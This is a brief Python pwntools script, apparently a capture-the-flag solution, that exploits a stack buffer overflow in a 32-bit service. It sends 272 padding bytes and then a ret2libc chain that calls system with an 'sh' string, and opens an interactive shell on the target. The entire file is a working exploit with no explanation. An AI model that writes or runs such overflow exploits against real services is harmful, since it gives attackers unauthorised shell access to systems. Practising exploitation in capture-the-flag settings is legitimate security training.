#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

if len(sys.argv) > 1:
    r = remote('', )
else:
    r = remote('127.0.0.1', 4444)

system = 0x8048380
sh = 0x80485db

raw_input('#')
p = 'A'*272 + p32(system) + p32(0x41414141) + p32(sh)
r.sendline(p)
r.interactive()
